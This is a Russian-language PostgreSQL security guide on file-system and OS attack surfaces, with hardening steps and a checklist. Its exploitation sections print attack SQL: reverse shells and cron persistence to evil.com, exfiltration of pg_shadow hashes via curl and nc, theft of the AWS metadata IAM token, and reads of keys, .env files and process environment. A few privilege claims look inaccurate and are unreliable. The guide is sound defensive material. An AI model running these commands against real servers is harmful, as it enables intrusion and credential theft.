# Файловая система и ОС

> **Содержание**
> 1. [Угрозы файловой системы в PostgreSQL](#угрозы)
> 2. [COPY ... TO/FROM PROGRAM — RCE-как-фича](#copy-program)
> 3. [Чтение файлов через pg_read_file](#pg-read-file)
> 4. [Large Objects (lo_import / lo_export)](#large-objects)
> 5. [Запись файлов через COPY TO](#copy-to)
> 6. [Чтение /etc/passwd и других системных файлов](#etc-passwd)
> 7. [Права на data/ каталог](#data-directory)
> 8. [WAL и archive_command](#wal-archive)
> 9. [Права на конфиги и сертификаты](#configs)
> 10. [Системный пользователь postgres](#system-user)
> 11. [seccomp / systemd hardening](#seccomp)
> 12. [Чеклист](#чеклист)

---

## Угрозы

PostgreSQL-процесс (backend) имеет доступ к файловой системе с правами
пользователя `postgres`. Это значит:
1. Может читать файлы (конфиги, ключи, секреты).
2. Может писать файлы (логи, временные, атаки через cron).
3. Может выполнять программы (через `COPY PROGRAM`).

Если атакующий получает SQL-инъекцию с правами суперпользователя — он
автоматически получает RCE на сервере. Это критическое отличие PostgreSQL от
БД с более строгой изоляцией.

---

## COPY ... TO/FROM PROGRAM

### Что это

```sql
COPY table_name FROM '/path/to/file.csv' WITH (format csv);
COPY table_name TO '/path/to/output.csv' WITH (format csv);

-- Или с shell-командой:
COPY table_name FROM PROGRAM 'curl http://example.com/data.csv' WITH (format csv);
COPY (SELECT * FROM users) TO PROGRAM 'nc evil.com 4444' WITH (format csv);
```

`PROGRAM` выполняется через `popen()` от имени пользователя `postgres`.

### Кто может использовать

Только суперпользователь, или роль с атрибутом `pg_execute_server_program`
(PostgreSQL 11+):

```sql
GRANT pg_execute_server_program TO backup_role;
```

По умолчанию `pg_execute_server_program` НЕ выдаётся PUBLIC.

### Эксплуатация (defensive)

Если атакующий имеет SQLi с правами суперпользователя:

```sql
-- Простой RCE:
COPY (SELECT 1) TO PROGRAM 'bash -c "bash -i >& /dev/tcp/evil.com/4444 0>&1"';

-- Эксфильтрация данных:
COPY (SELECT username, password_hash FROM pg_shadow)
  TO PROGRAM 'curl -d @- http://evil.com/collect';

-- Закрепление (persistance):
COPY (SELECT '@reboot bash -i >& /dev/tcp/evil.com/4444 0>&1')
  TO PROGRAM 'crontab -';
```

### Защита

1. **Никогда** не выдавать `pg_execute_server_program` приложению.
   ```sql
   REVOKE pg_execute_server_program FROM PUBLIC;
   -- Проверить, кто имеет:
   SELECT r.rolname FROM pg_authid r
   JOIN pg_auth_members m ON m.roleid = r.oid
   WHERE r.rolname = 'pg_execute_server_program';
   ```

2. Приложение не должно подключаться как суперпользователь.

3. Если `COPY PROGRAM` нужен для ETL — отдельная роль с минимальными правами,
   запускаемая из controlled job (cron, Airflow), не из приложения.

4. На уровне ОС: запускать postgres в seccomp-jail, запрещающем `fork`/`exec`
   (но тогда `COPY PROGRAM` перестанет работать для всех).

### Анти-пример: COPY PROGRAM для ETL

```python
# В ETL-скрипте:
cursor.execute("COPY raw_logs FROM PROGRAM 'gunzip -c /data/logs/*.gz'")
```

Кажется удобным. Но:
1. Если `cursor.execute` получит SQLi через логику приложения — атакующий
   выполнит любую команду.
2. Если путь к файлам контролируется пользователем — command injection.

**Патч**:gunzip делать в Python, загружать через `COPY FROM STDIN`:
```python
import gzip
import io

with gzip.open('/data/logs/file.gz', 'rt') as f:
    cursor.copy_expert("COPY raw_logs FROM STDIN WITH (format csv)", f)
```

---

## pg_read_file

### Что это

`pg_read_file(filename)` — функция для чтения файлов на сервере. Доступна
только суперпользователю (или роль с `pg_read_server_files` с PG 11+).

```sql
SELECT pg_read_file('/etc/passwd');
-- Возвращает содержимое файла как text
```

### Сопутствующие функции

```sql
-- Чтение бинарного файла:
SELECT pg_read_binary_file('/etc/ssl/private/server.key');

-- Листинг директории:
SELECT pg_ls_dir('/etc/postgresql/');

-- Статистика файла:
SELECT pg_stat_file('/etc/passwd');
```

### Эксплуатация

```sql
-- Чтение приватного ключа сервера:
SELECT pg_read_file('/etc/postgresql/15/main/server.key');

-- Чтение app secrets:
SELECT pg_read_file('/var/www/app/.env');

-- Чтение /etc/shadow (нужны права root, но postgres обычно не root):
SELECT pg_read_file('/etc/shadow');

-- Чтение метаданных AWS:
SELECT pg_read_file('/var/lib/cloud/instance-id');
```

### Защита

1. `REVOKE EXECUTE` на функции от PUBLIC:
   ```sql
   REVOKE EXECUTE ON FUNCTION pg_read_file(text) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION pg_read_file(text, bigint, bigint) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION pg_read_file(text, bigint, bigint, boolean) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION pg_read_binary_file(text) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION pg_read_binary_file(text, bigint, bigint) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION pg_read_binary_file(text, bigint, bigint, boolean) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION pg_ls_dir(text) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION pg_stat_file(text) FROM PUBLIC;
   REVOKE EXECUTE ON FUNCTION pg_stat_file(text, boolean) FROM PUBLIC;
   ```

2. Не выдавать `pg_read_server_files` / `pg_read_all_stats` кому-либо, кроме
   DBA.

3. На уровне ОС: права на sensitive-файлы должны быть `600` (или `640` для
   postgres group), НЕ `644`.

### Анти-пример: REVOKE не сработал

```sql
REVOKE EXECUTE ON FUNCTION pg_read_file(text) FROM PUBLIC;
-- Потом проверка:
SELECT pg_read_file('/etc/passwd');
-- Все равно работает!
```

Почему? Функция `pg_read_file` имеет `SECURITY DEFINER`, и доступ к ней
проверяется через ACL. Если роль уже имеет EXECUTE (например, через
`pg_read_server_files`), REVOKE от PUBLIC не отзывает у неё.

**Патч**: проверить, кто ещё имеет доступ:
```sql
SELECT pg_get_userbyid(grantee) AS grantee, privilege_type
FROM pg_proc p
CROSS JOIN aclexplode(p.proacl)
WHERE p.proname = 'pg_read_file';
```

---

## Large Objects

`Large Objects` — механизм хранения больших бинарных объектов в PostgreSQL
(альтернатива bytea). Имеет API через `lo_import`, `lo_export`, `lo_read`,
`lo_write`.

### lo_import

```sql
SELECT lo_import('/etc/passwd');
-- Возвращает OID большого объекта, содержимое которого = /etc/passwd
```

### lo_export

```sql
SELECT lo_export(16384, '/tmp/passwd_copy');
-- Записывает большой объект 16384 в файл /tmp/passwd_copy
```

### Эксплуатация

Атакующий с правами (по умолчанию PUBLIC имеет EXECUTE):

```sql
-- Шаг 1: прочитать /etc/passwd
SELECT lo_import('/etc/passwd');  -- вернёт, например, 16384

-- Шаг 2: прочитать содержимое через loread
SELECT loread(16384, 1000000);

-- Шаг 3: записать в произвольное место
SELECT lo_export(16384, '/var/lib/postgresql/.bashrc');
-- Если postgres имеет права на /var/lib/postgresql/ (а он имеет) —
-- можно перезаписать .bashrc, который выполнится при следующем su postgres
```

### Защита

```sql
-- Отозвать у PUBLIC:
REVOKE EXECUTE ON FUNCTION lo_import(text) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_import(text, oid) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_export(oid, text) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_read(oid, bigint, int) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_write(oid, bigint, bytea) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_create(oid) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_unlink(oid) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_truncate(oid, int) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_truncate64(oid, bigint) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_lseek(oid, int, int) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_lseek64(oid, bigint, int) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_tell(oid) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_tell64(oid) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_put(oid, bigint, bytea) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_get(oid) FROM PUBLIC;
REVOKE EXECUTE ON FUNCTION lo_get(oid, bigint, int) FROM PUBLIC;

-- Если large objects не используются вообще:
-- Рассмотреть отключение через конфиг (но это не disables функции).
```

### Аудит существующих large objects

```sql
SELECT loid, pg_get_userbyid(lomowner) AS owner, lomacl
FROM pg_largeobject_metadata
ORDER BY loid;
-- Проверить, что все large objects имеют явного владельца и нет
-- принадлежащих PUBLIC
```

---

## COPY TO

### Что это

```sql
COPY table_name TO '/tmp/dump.csv' WITH (format csv);
COPY (SELECT * FROM sensitive_table) TO '/tmp/leak.csv';
```

Записывает данные таблицы в файл. Аналог `pg_dump` для одной таблицы.

### Кто может использовать

Суперпользователь или роль с `pg_write_server_files` (PG 11+).

### Эксплуатация

```sql
-- Эксфильтрация в файл, доступный веб-сервером:
COPY (SELECT * FROM users) TO '/var/www/html/leak.csv';

-- Эксфильтрация через /tmp, который может быть прочитан другим процессом:
COPY (SELECT password_hash FROM pg_shadow) TO '/tmp/shadow_dump';

-- Перезапись конфига (если права позволяют):
COPY (SELECT 'malicious_config_line') TO '/etc/postgresql/15/main/conf.d/evil.conf';
```

### Защита

```sql
REVOKE pg_write_server_files FROM PUBLIC;
-- Проверить, у кого есть:
SELECT r.rolname FROM pg_authid r
JOIN pg_auth_members m ON m.roleid = r.oid
WHERE r.rolname IN ('pg_write_server_files', 'pg_read_server_files',
                    'pg_execute_server_program', 'pg_read_all_stats',
                    'pg_signal_backend');
```

---

## Чтение системных файлов

### /etc/passwd

```sql
-- Через pg_read_file (нужен superuser или pg_read_server_files):
SELECT pg_read_file('/etc/passwd');

-- Через lo_import (если REVOKE не сделан):
SELECT lo_import('/etc/passwd');
SELECT loread(16384, 100000);
```

### /etc/shadow

PostgreSQL-пользователь обычно НЕ root, поэтому `/etc/shadow` (права `640
shadow`) недоступен. Но в старых системах или с `chmod 644` — да.

### AWS metadata

На EC2 инстансах:
```sql
SELECT pg_read_file('/var/lib/cloud/data/instance-id');
-- Или через COPY PROGRAM:
COPY (SELECT 1) TO PROGRAM 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/';
-- Возвращает IAM-токены
```

### /proc/self/environ

```sql
SELECT pg_read_file('/proc/self/environ');
-- Возвращает переменные окружения процесса postgres
-- включая DATABASE_PASSWORD=... если админ установил через env
```

### Защита

1. `REVOKE` на все функции чтения файлов (см. выше).
2. Запускать PostgreSQL-сервер под отдельным пользователем (не root).
3. AppArmor / SELinux профиль для postgres — ограничить доступные файлы.
4. Не хранить секреты в `/etc/environment` или `~/.bashrc` postgres-пользователя.

---

## data/

Каталог `data/` (обычно `/var/lib/postgresql/15/main/`) содержит:
- `postgresql.conf` (если не вынесен)
- `pg_hba.conf`
- `server.key` (если не вынесен)
- Все данные БД (файлы таблиц, индексов, WAL)
- `pg_wal/` — WAL-сегменты
- `pg_xact/` — commit-лог

### Права

```bash
ls -la /var/lib/postgresql/15/main/
# Должно быть 700 для postgres:postgres
```

Если права шире — любой пользователь системы может:
1. Прочитать данные таблиц (PostgreSQL-файлы — это последовательность
   страниц 8KB, в которых данные в plaintext, не считая WAL, который
   можно реверснуть).
2. Прочитать `server.key` — приватный ключ TLS.
3. Удалить / повредить данные.

### Аудит

```bash
# Рекурсивная проверка:
sudo find /var/lib/postgresql/ -type f \( -perm /o+r -o -perm /o+w -o -perm /g+w \) -ls
# Должно быть пусто (только владелец читает)

# Проверка owner:
sudo find /var/lib/postgresql/ ! -user postgres -ls
# Должно быть пусто
```

### Анти-пример

```bash
# Админ сделал для удобства бэкапа:
sudo chmod -R 777 /var/lib/postgresql/15/main/
# Теперь www-data (веб-сервер) может прочитать БД напрямую
```

**Патч**:
```bash
sudo chown -R postgres:postgres /var/lib/postgresql/
sudo chmod 700 /var/lib/postgresql/15/main/
```

---

## WAL

WAL (Write-Ahead Log) — журнал транзакций в `pg_wal/`. Содержит все
изменения данных. Можно использовать для:
1. Point-in-time recovery.
2. Физической репликации.
3. **Эксфильтрации данных** (если у атакующего есть доступ к WAL).

### archive_command

```conf
# postgresql.conf
archive_mode = on
archive_command = 'rsync -a %p backup-server:/wal-archive/%f'
```

`archive_command` выполняется от имени postgres. Если админ ошибётся в
shell-метасимволах — command injection из имени файла WAL.

### Анти-пример

```conf
archive_command = 'cp %p /backup/%f'
```

Если атакующий создаст таблицу с specially-crafted именем, и PostgreSQL
запишет WAL с этим именем — `%p` может содержать shell injection. Нет,
это невозможно: `%p` — это путь к файлу WAL (32-символьный hex), не
содержимое.

Но:
```conf
archive_command = 'scp %p user@backup-server:~/$(date +%Y/%m/%d)/%f'
```
Если `date` не available — `archive_command` упадёт, WAL перестанет
архивироваться, диск заполнится → DoS.

### Защита

1. `archive_command` — простой и явный. Не использовать `$(...)` или backticks.
2. Тестировать после изменения.
3. Мониторить `pg_stat_archiver`:
   ```sql
   SELECT * FROM pg_stat_archiver;
   -- Если last_failed_wal != NULL — были сбои
   ```

### Репликация

Физическая репликация использует WAL. Если реплика скомпрометирована —
атакующий видит все изменения в реальном времени.

```sql
SELECT * FROM pg_stat_replication;
-- Какие replica-серверы подключены

SELECT * FROM pg_replication_slots;
-- Слоты репликации
```

**Защита**:
1. `REPLICATION` privilege только для dedicated backup/replica-роли.
2. Реплика должна быть в той же security zone, что и primary.
3. Соединение primary-replica — mTLS.
4. Мониторить новые подключения replication-слотов.

---

## Конфиги

### postgresql.conf

```bash
ls -la /etc/postgresql/15/main/postgresql.conf
# Должно быть 644 postgres:postgres
# Если 666 или 606 — кто угодно может изменить конфиг
```

Если файл изменён атакующим — можно добавить `unix_socket_directories =
/tmp` или `listen_addresses = '*'`, или `shared_preload_libraries =
'backdoor'`.

### pg_hba.conf

```bash
ls -la /etc/postgresql/15/main/pg_hba.conf
# Должно быть 640 postgres:postgres (или 600)
```

`pg_hba.conf` может содержать пароли (для LDAP-бинда) или другие секреты.
Права должны быть минимальными.

### server.key

```bash
ls -la /etc/postgresql/15/main/server.key
# Должно быть 600 postgres:postgres
# Если 644 — приватный ключ утёк
```

---

## Системный пользователь postgres

### Принципы

1. `postgres` — единственный пользователь с доступом к data/.
2. `postgres` не должен иметь прав на other-сервисы (nginx, app-код).
3. `postgres` не должен иметь sudo без пароля.
4. `postgres` не должен иметь shell `/bin/bash` — лучше `/bin/false` (только
   если подключение через `su - postgres` не используется; обычно
   используется для systemd-сервиса).

### Аудит

```bash
# Кто такой postgres:
getent passwd postgres
# postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

# Sudo-права postgres:
sudo -l -U postgres
# Должно быть: "User postgres is not allowed to run sudo"

# Список процессов от postgres:
ps -u postgres
# Только postgres-процессы (postmaster, checkpointer, walwriter, ...)

# Crontab postgres:
sudo -u postgres crontab -l
# Должно быть пусто или только валидные задачи
```

### Анти-пример: postgres в sudoers

```
# /etc/sudoers.d/postgres
postgres ALL=(ALL) NOPASSWD: ALL
```

Если PostgreSQL-процесс скомпрометирован → атакующий через `COPY PROGRAM
'sudo bash'` получает root.

**Патч**:
```bash
sudo rm /etc/sudoers.d/postgres
# Или оставить только конкретные команды, если нужны:
echo "postgres ALL=(root) NOPASSWD: /usr/bin/systemctl reload postgresql" | \
  sudo tee /etc/sudoers.d/postgres
```

---

## seccomp

Seccomp (secure computing mode) — ограничивает список системных вызовов,
которые может делать процесс. Применяется через systemd или Docker.

### systemd профиль

```ini
# /etc/systemd/system/postgresql.service.d/hardening.conf
[Service]
NoNewPrivileges=true
PrivateTmp=true
PrivateDevices=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=/var/lib/postgresql /var/log/postgresql /var/run/postgresql
ProtectKernelTunables=true
ProtectKernelModules=true
ProtectControlGroups=true
LockPersonality=true
RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6
RestrictNamespaces=true
RestrictRealtime=true
RestrictSUIDSGID=true
MemoryDenyWriteExecute=true
SystemCallFilter=@system-service
SystemCallFilter=~@privileged @resources
SystemCallArchitectures=native
CapabilityBoundingSet=
AmbientCapabilities=
```

Это ограничит postgres до:
- Чтения/записи только в `/var/lib/postgresql`, `/var/log/postgresql`,
  `/var/run/postgresql`.
- Не может загружать модули ядра.
- Не может делать `setuid`.
- Не может менять namespaces.

### Docker / Podman

```bash
docker run -d \
  --name postgres \
  --read-only \
  --tmpfs /tmp \
  --security-opt no-new-privileges \
  --security-opt seccomp=postgres-seccomp.json \
  --cap-drop ALL \
  --cap-add CHOWN SETUID SETGID \
  -v pgdata:/var/lib/postgresql/data \
  postgres:15
```

`--read-only` делает файловую систему только для чтения (кроме explicitly
примонтированных volume). Атакующий не может записать backdoor в /usr/bin/.

### Анти-пример: postgres с `--privileged`

```bash
docker run --privileged postgres:15
```

`--privileged` отключает все security-механизмы Docker. Если postgres
скомпрометирован — атакующий получает root в контейнере и может (через
контейнерный escape) получить root на хосте.

**Патч**: никогда `--privileged`. Использовать минимальный набор capabilities.

---

## Чеклист

- [ ] `REVOKE EXECUTE ON FUNCTION pg_read_file, pg_ls_dir, pg_stat_file, lo_import, lo_export FROM PUBLIC`.
- [ ] `REVOKE pg_execute_server_program FROM PUBLIC`.
- [ ] `REVOKE pg_read_server_files FROM PUBLIC`.
- [ ] `REVOKE pg_write_server_files FROM PUBLIC`.
- [ ] Приложение подключается НЕ как суперпользователь.
- [ ] `data/` каталог имеет права `700 postgres:postgres`.
- [ ] `server.key` имеет права `600 postgres:postgres`.
- [ ] `pg_hba.conf` имеет права `640 postgres:postgres`.
- [ ] `postgresql.conf` не содержит секретов (пароли в env / Vault).
- [ ] `archive_command` простой, без shell-метасимволов.
- [ ] `postgres` пользователь не имеет sudo-прав.
- [ ] systemd / Docker hardening применён (seccomp, no-new-privileges).
- [ ] AppArmor / SELinux профиль для postgres активен.
- [ ] Мониторинг `pg_stat_archiver` (нет сбоев архивации).
- [ ] Мониторинг `pg_replication_slots` (нет несанкционированных слотов).
- [ ] Логи PostgreSQL защищены от модификации (append-only).
- [ ] Бэкапы шифруются (at-rest).
- [ ] Бэкапы хранятся в отдельной зоне (не на том же сервере).
- [ ] В Docker — `--read-only` + explicit volume mounts.
- [ ] Нет `--privileged` флага для postgres-контейнера.
